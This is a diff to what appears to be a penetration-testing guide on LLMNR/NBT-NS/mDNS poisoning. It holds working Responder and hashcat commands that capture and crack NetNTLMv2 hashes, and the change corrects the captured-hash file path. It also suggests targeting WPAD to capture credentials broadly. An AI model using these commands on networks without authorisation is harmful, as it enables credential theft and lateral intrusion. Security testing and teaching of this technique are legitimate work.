@@ -26,8 +26,9 @@ When a Windows host tries to reach a name that DNS cannot resolve (a typo, a dec
 # Responder: answer LLMNR/NBT-NS/mDNS and run rogue SMB/HTTP/etc. to capture NetNTLMv2
 responder -I eth0 -wv
 
-# Captured hashes are written under logs/ in hashcat -m 5600 format
-hashcat -m 5600 Responder-Session.log wordlist.txt -r rules/best64.rule
+# Responder writes captured hashes to per-module files under logs/ (not the
+# session log), e.g. logs/SMB-NTLMv2-SSP-<ip>.txt, in hashcat -m 5600 format
+hashcat -m 5600 logs/SMB-NTLMv2-SSP-10.0.0.5.txt wordlist.txt -r rules/best64.rule
 ```
 
 Target WPAD specifically: many networks never set a real `wpad` DNS record, so every browser's proxy lookup can be answered, capturing authentication broadly.
